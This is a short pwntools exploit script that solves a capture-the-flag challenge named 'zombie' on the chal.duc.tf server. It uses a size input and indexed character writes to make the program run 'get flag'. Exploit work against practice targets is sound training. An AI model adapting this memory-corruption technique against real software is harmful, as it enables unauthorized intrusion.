from pwn import *
from sys import argv

if 'gdb' in argv:
    p = gdb.debug('./zombie', 'c')
elif 'local' in argv:
    p = process('./zombie')
else:
    p = remote('chal.duc.tf', 30008)

def infect(num):
    global p

    p.sendlineafter('you do?', 'infect')
    p.sendlineafter('infect?', str(num))


infect(0x50)
p.sendline('eat brains'.ljust(0x50))

for i, c in enumerate('get flag  '):
    p.recvuntil('a victim')
    p.sendline(str(i))
    p.recvuntil('ch!')
    p.sendline(str(ord(c)))

p.recvuntil('a victim')
p.sendline('done')
p.interactive()
